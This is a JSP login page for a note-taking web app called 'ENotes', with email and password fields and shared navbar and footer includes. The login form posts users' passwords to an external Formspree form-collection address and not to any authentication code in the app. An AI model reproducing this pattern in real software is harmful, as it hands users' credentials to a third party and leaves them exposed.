<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
	pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<link rel="shortcut icon" href="./images/favicon.png"
	type="image/x-icon">
<title>ENotes - Login</title>
<%@include file="./components/cdn.jsp"%>
<link rel="stylesheet" href="./css/login.css">
</head>
<body>
	<%@include file="./components/navbar.jsp"%>
	
	<div class="container login-container">
		
		<h2 class="signup-title">Login</h2>
		
		<form action="https://formspree.io/f/xvonkjkd" method="post"
			class="login-form">
			<input type="email" name="email" placeholder="Email Address"
				required> <input type="password" name="password"
				placeholder="Password" required>
			<button type="submit" class="btn">Login</button>
		</form>

	</div>

	<%@include file="./components/footer.jsp"%>
</body>
</html>